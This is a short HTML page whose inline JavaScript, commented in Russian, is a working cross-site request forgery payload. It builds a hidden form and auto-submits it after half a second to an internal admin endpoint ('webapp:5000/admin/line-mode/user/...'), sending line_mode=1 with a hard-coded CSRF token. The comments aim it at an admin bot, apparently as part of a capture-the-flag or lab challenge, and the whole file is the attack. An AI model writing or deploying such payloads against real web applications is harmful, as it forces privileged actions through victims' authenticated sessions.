<!DOCTYPE html>
<html>
<body>
    <script>
        // Создаем форму программно, чтобы она была "чистой" для браузера
        const form = document.createElement('form');
        form.method = 'POST';
        // Обязательно используем внутренний адрес, который видит бот!
        form.action = 'http://webapp:5000/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3';

        const lineMode = document.createElement('input');
        lineMode.type = 'hidden';
        lineMode.name = 'line_mode';
        lineMode.value = '1';

        const token = document.createElement('input');
        token.type = 'hidden';
        token.name = 'csrf_token';
        // Тот самый токен из твоего первого сообщения
        token.value = 'fMvNFzkKYpKZDShuo9h0AuKIi9djy0OcVRT4TxyoWH0';

        form.appendChild(lineMode);
        form.appendChild(token);
        document.body.appendChild(form);
        
        // Отправляем через небольшую паузу, чтобы куки успели "улечься"
        setTimeout(() => { form.submit(); }, 500);
    </script>
</body>
</html>
